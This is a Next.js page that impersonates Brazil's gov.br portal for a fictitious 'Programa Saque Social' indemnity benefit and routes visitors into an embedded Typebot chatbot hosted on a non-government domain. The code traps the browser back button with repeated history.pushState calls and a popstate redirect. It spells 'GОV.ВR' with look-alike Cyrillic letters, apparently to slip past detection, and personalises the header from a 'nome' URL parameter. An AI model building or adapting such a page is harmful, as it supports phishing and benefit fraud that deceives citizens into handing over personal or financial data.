
"use client";

import React, { useState, useEffect, Suspense } from 'react';
import Head from 'next/head';
import Image from 'next/image';
import Script from 'next/script';
import { useSearchParams, useRouter } from 'next/navigation';
import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
import '../chat-page.css'; // Styles specific to this chat page

function ChatPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [isLoading, setIsLoading] = useState(true);
  const [headerUserName, setHeaderUserName] = useState('Usuário');
  const [isTypebotScriptLoaded, setIsTypebotScriptLoaded] = useState(false);

  useEffect(() => {
    const urlBackRedirect = '/back/index.html';
    const query = searchParams.toString();
    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + query;

    history.pushState({}, "", window.location.href);
    history.pushState({}, "", window.location.href);

    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);

    const nomeParam = searchParams.get('nome');
    if (nomeParam) {
      setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
    }

    const loadingTimer = setTimeout(() => {
      setIsLoading(false);
    }, 1200);

    return () => {
      window.removeEventListener('popstate', handlePopState);
      clearTimeout(loadingTimer);
    };
  }, [searchParams]);

  useEffect(() => {
    if (isTypebotScriptLoaded && typeof window.Typebot !== 'undefined' && typeof window.Typebot.initStandard === 'function') {
      const typebotElement = document.querySelector('typebot-standard');
      if (typebotElement) {
        // A simple check to avoid re-initializing if Typebot has already rendered its content
        if (!typebotElement.shadowRoot?.querySelector('.typebot-container')) {
           console.log('Initializing Typebot from useEffect...');
           window.Typebot.initStandard({
             typebot: "24lkdef",
             apiHost: "https://chat.bestbot.info"
           });
        } else {
          console.log('Typebot already initialized (checked in useEffect).');
        }
      } else {
        console.error('Typebot standard element not found in DOM (useEffect).');
      }
    } else if (isTypebotScriptLoaded) {
      console.error('window.Typebot or window.Typebot.initStandard is not available, but script reported loaded (useEffect).');
    }
  }, [isTypebotScriptLoaded]); // Runs when isTypebotScriptLoaded changes

  return (
    <>
      <Head>
        <title>Programa Saque Social - Atendimento</title>
      </Head>

      <Script
        id="typebot-script"
        src="https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.59/dist/web.js"
        strategy="afterInteractive"
        onLoad={() => {
          console.log('Typebot script loaded via next/script.');
          setIsTypebotScriptLoaded(true);
        }}
        onError={(e) => {
          console.error('Error loading Typebot script:', e);
        }}
      />
      
      <div className="chat-page-body">
        {isLoading && (
          <div id="loading-screen">
            <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <title>GОV.ВR</title>
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
        )}

        <header className="chat-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User />
              <span>{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="chat-page-nav">
          <button>
            <Menu />
            <p>Benefício <span> &gt; </span> Indenização <span> &gt; </span> Atendimento</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        <div className="typebot-container-wrapper">
            <div className="typebot-embed-container">
                 <typebot-standard style={{ width: '100%', height: '100%' }}></typebot-standard>
            </div>
        </div>
        
        <footer className="chat-page-footer">
          <Image 
            src="https://i.imgur.com/919uhHG.png"
            alt="Rodapé Logo" 
            width={150} 
            height={40} 
            className="footer-logo"
            data-ai-hint="company logo"
            priority={false}
          />
        </footer>
      </div>
    </>
  );
}

export default function ChatPage() {
  return (
    <Suspense fallback={
      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
          <title>GОV.ВR</title> 
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
          </text> 
        </svg> 
      </div>
    }>
      <ChatPageContent />
    </Suspense>
  );
}
